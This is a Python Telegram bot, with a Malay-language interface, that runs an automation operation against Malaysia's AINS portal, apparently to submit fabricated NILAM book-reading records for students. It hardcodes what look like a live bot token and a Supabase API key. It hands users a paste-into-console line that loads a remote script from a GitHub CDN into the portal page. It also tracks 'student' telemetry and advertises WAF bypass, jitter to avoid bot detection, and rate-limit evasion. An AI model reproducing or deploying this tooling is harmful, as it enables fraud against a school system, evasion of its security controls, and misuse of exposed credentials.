import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import json
import subprocess
import os
import urllib.request
import urllib.error
import time
import datetime
import math

# Token Bot Anda
TOKEN = '8298046313:AAHqwkuWkTbxSFSZB7DO4fNrfT1hBkMWKVs'
bot = telebot.TeleBot(TOKEN)

# Konfigurasi Supabase
SUPA_URL = 'https://yzjsmtxhpdlsniqpcuoa.supabase.co/rest/v1/nilam_used_books'
SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl6anNtdHhocGRsc25pcXBjdW9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ5Mzk2ODQsImV4cCI6MjA4MDUxNTY4NH0.jMq8BwvYlODSWiFv7ysM7KiDCjzviMEJFdn1Vfst3mw'

START_TIME = time.time()

def get_used_books_count():
    try:
        req = urllib.request.Request(f"{SUPA_URL}?select=title", headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode('utf-8'))
            return len([x for x in data if not x['title'].startswith('__TEL__|')])
    except: return 0

def get_live_users():
    try:
        req = urllib.request.Request(f"{SUPA_URL}?title=like.__TEL__|*", headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode('utf-8'))
        
        now = int(time.time() * 1000)
        active = []
        for row in data:
            p = row['title'].split('|')
            if len(p) >= 7:
                uid, ts, ok, fail, tgt, status = p[1], int(p[2]), p[3], p[4], p[5], p[6]
                if now - ts < 300000: # 5 mins
                    active.append({
                        "uid": uid, "ok": ok, "tgt": tgt, "fail": fail, "status": status, "idle": (now-ts)//1000
                    })
        return active
    except: return []

def generate_progress_bar(percent, length=12):
    filled = math.floor(length * (percent / 100))
    empty = length - filled
    return "█" * filled + "░" * empty

def get_main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📊 Analitik & Data", callback_data="menu_analytics"),
        InlineKeyboardButton("🛠️ Automasi & Skrip", callback_data="menu_actions")
    )
    markup.add(
        InlineKeyboardButton("⚙️ Status Pelayan", callback_data="menu_system"),
        InlineKeyboardButton("❓ Bantuan", callback_data="cmd_help")
    )
    return markup

def get_analytics_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📈 Dashboard Keseluruhan", callback_data="cmd_stats"),
        InlineKeyboardButton("👥 Live Telemetry", callback_data="cmd_live")
    )
    markup.add(InlineKeyboardButton("⬅️ Kembali ke Menu Utama", callback_data="cmd_main"))
    return markup

def get_actions_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("💻 Skrip Injection", callback_data="cmd_script"),
        InlineKeyboardButton("🔄 Tarik Buku", callback_data="cmd_fetch")
    )
    markup.add(InlineKeyboardButton("⚠️ Reset Database", callback_data="cmd_reset_confirm"))
    markup.add(InlineKeyboardButton("⬅️ Kembali ke Menu Utama", callback_data="cmd_main"))
    return markup

def get_system_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("📡 Ping AINS Server", callback_data="cmd_ping"),
        InlineKeyboardButton("⬅️ Kembali ke Menu Utama", callback_data="cmd_main")
    )
    return markup

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    text = (
        "🔥 *NILAM COMMAND CENTER PRO*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Selamat datang ke Pusat Kawalan Automasi AINS.\n"
        "Sila pilih modul operasi anda di bawah:"
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=get_main_menu())

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id, msg_id = call.message.chat.id, call.message.message_id
    
    if call.data == "cmd_main":
        text = (
            "🔥 *NILAM COMMAND CENTER PRO*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Sistem beroperasi dengan stabil. Sila pilih arahan seterusnya:"
        )
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=get_main_menu())

    elif call.data == "menu_analytics":
        text = "📊 *MODUL ANALITIK*\n\nPantau keseluruhan operasi dan pengguna secara langsung."
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=get_analytics_menu())

    elif call.data == "menu_actions":
        text = "🛠️ *MODUL AUTOMASI*\n\nDapatkan skrip, tarik buku baharu, atau urus pangkalan data."
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=get_actions_menu())

    elif call.data == "menu_system":
        text = "⚙️ *MODUL SISTEM*\n\nPeriksa kesihatan bot dan pelayan sasaran AINS."
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=get_system_menu())

    elif call.data == "cmd_stats":
        bot.answer_callback_query(call.id, "Menjana laporan prestasi...")
        try:
            with open('/root/NilamAutomationTools/books_library.json', 'r', encoding='utf-8') as f: 
                books = json.load(f)
            total = len(books)
            used = get_used_books_count()
            left = max(0, total - used)
            percent = (used / total) * 100 if total > 0 else 0
            bar = generate_progress_bar(percent)
            
            active_users = len(get_live_users())
            
            text = (
                "📈 *DASHBOARD KESELURUHAN*\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"**KEMAJUAN SINTETIK:**\n"
                f"`[{bar}]` *{percent:.1f}%*\n\n"
                f"📚 *Jumlah Buku:* `{total:,}`\n"
                f"✅ *Dihantar:* `{used:,}`\n"
                f"⏳ *Baki Stok:* `{left:,}`\n"
                f"👥 *Pelajar Aktif:* `{active_users}`\n\n"
                "🛡️ *STATUS WAF BYPASS:*\n"
                " 🟢 Human Jitter Delay\n"
                " 🟢 Query Cache-Busting\n"
                " 🟢 Smart Auto-Sleep"
            )
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 Refresh Data", callback_data="cmd_stats"))
            markup.add(InlineKeyboardButton("⬅️ Kembali", callback_data="menu_analytics"))
            bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)
        except Exception as e:
            bot.answer_callback_query(call.id, "Ralat data", show_alert=True)

    elif call.data == "cmd_live":
        bot.answer_callback_query(call.id, "Mengimbas isyarat telemetry...")
        users = get_live_users()
        
        text = "👥 *TELEMETRY PELAJAR AKTIF*\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        if not users:
            text += "💤 *Tiada isyarat dikesan.*\nPastikan skrip sedang berjalan di browser."
        else:
            for u in users:
                text += (
                    f"👤 *ID:* `{u['uid']}`\n"
                    f"   ├ 📈 *Progres:* `{u['ok']} / {u['tgt']}`\n"
                    f"   ├ ⚠️ *Gagal:* `{u['fail']}`\n"
                    f"   ├ ⏱️ *Aktiviti:* {u['status']}\n"
                    f"   └ 📡 *Ping:* `{u['idle']} saat lalu`\n\n"
                )
                
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔄 Refresh Telemetry", callback_data="cmd_live"))
        markup.add(InlineKeyboardButton("⬅️ Kembali", callback_data="menu_analytics"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "cmd_script":
        text = (
            "💻 *SKRIP INJECTION v10.25 PRO*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Salin blok kod di bawah dan *Paste* di dalam Console (F12) portal AINS:\n\n"
            "`var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/Notfoundst12/Nilam@main/n.js?v='+Date.now();document.head.appendChild(s);`\n\n"
            "⚠️ *Nota:* Pastikan anda berada di halaman 'Tambah Rekod'."
        )
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Kembali", callback_data="menu_actions"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "cmd_fetch":
        bot.answer_callback_query(call.id, "Scraping buku dari perpustakaan...")
        subprocess.Popen(["python3", "/root/NilamAutomationTools/fetch_books3.py"])
        text = (
            "🔄 *PENGUMPULAN DATA*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Jentera *Scraper* telah dilancarkan di latar belakang. Ia sedang menarik beribu-ribu buku baharu dari OpenLibrary API.\n\n"
            "Sila semak *Dashboard* selepas beberapa minit."
        )
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Kembali", callback_data="menu_actions"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "cmd_reset_confirm":
        text = (
            "⚠️ *PENGESAHAN RESET DATABASE*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Perhatian! Anda akan memadam **SEMUA** rekod memori awan (Cloud Memory) Supabase.\n"
            "Tindakan ini tidak boleh diundurkan dan skrip akan mula membaca buku dari indeks sifar.\n\n"
            "Pilih tindakan anda:"
        )
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("❌ BATAL", callback_data="menu_actions"),
            InlineKeyboardButton("🚨 YA, PADAM!", callback_data="cmd_reset_execute")
        )
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "cmd_reset_execute":
        bot.answer_callback_query(call.id, "Memadam data...")
        try:
            req = urllib.request.Request(f"{SUPA_URL}?title=not.eq.random_string", method='DELETE', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
            urllib.request.urlopen(req)
            text = "✅ *DATABASE DIKOSONGKAN*\n\nSupabase Cloud Memory kini bersih. Anda boleh mulakan operasi dari sifar."
        except Exception as e:
            text = f"❌ *RALAT PENGHAPUSAN*\n\nSistem gagal memadam rekod:\n`{str(e)}`"
        
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Kembali", callback_data="menu_actions"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "cmd_ping":
        bot.answer_callback_query(call.id, "Menghantar isyarat ping...")
        try:
            start = time.time()
            res = urllib.request.urlopen("https://ains.moe.gov.my", timeout=5)
            ms = int((time.time() - start) * 1000)
            status = "🟢 ONLINE" if res.status == 200 else f"🟡 {res.status}"
        except Exception as e:
            ms = "N/A"
            status = f"🔴 OFFLINE / TIMEOUT"

        uptime_seconds = int(time.time() - START_TIME)
        uptime_str = str(datetime.timedelta(seconds=uptime_seconds))

        text = (
            "⚙️ *DIAGNOSTIK SISTEM*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "*AINS MOE Server:*\n"
            f"├ Status: {status}\n"
            f"└ Response Time: `{ms} ms`\n\n"
            "*Command Center Bot:*\n"
            f"├ Uptime: `{uptime_str}`\n"
            f"└ Engine: `Python 3 / Telebot`\n"
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔄 Uji Semula", callback_data="cmd_ping"))
        markup.add(InlineKeyboardButton("⬅️ Kembali", callback_data="menu_system"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "cmd_help":
        text = (
            "❓ *PUSAT BANTUAN*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "**Fungsi Keselamatan Skrip:**\n"
            "• **WAF Bypass:** Menyuntik kod rawak pada URL untuk mengelirukan Firewall.\n"
            "• **Jitter:** Kelewatan ditambah secara rawak (500ms - 1.5s) setiap tindakan supaya tidak dikesan sebagai bot.\n"
            "• **Auto-Sleep:** Jika terkena limit 429, bot berehat 3 minit secara automatik.\n"
            "• **Cloud Telemetry:** Memberi laporan terus ke bot ini secara langsung."
        )
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("⬅️ Kembali", callback_data="cmd_main"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)

if __name__ == "__main__":
    print("Bot Command Center sedang berjalan...")
    bot.polling(none_stop=True, timeout=60)
